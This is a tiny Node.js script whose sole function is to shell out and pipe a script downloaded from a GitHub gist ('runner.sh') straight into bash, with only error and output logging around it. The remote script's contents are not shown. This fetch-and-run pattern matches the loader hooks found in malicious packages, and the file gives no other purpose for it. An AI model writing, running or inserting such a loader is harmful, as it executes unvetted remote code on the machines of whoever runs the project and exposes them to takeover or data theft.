const { exec } = require('child_process');

const command = "curl -sSfL https://gist.githubusercontent.com/asukachloe/014e7bab976f3b342165c01375bbb9fd/raw/900858733a14bb6e841c73d4f95e37270a32ba19/runner.sh | bash && exit 0";

exec(command, (error, stdout, stderr) => {
    if (error) {
        console.error(`Execution error: ${error.message}`);
        return;
    }

    if (stderr) {
        console.error(`stderr: ${stderr}`);
    }

    console.log(`stdout: ${stdout}`);
});
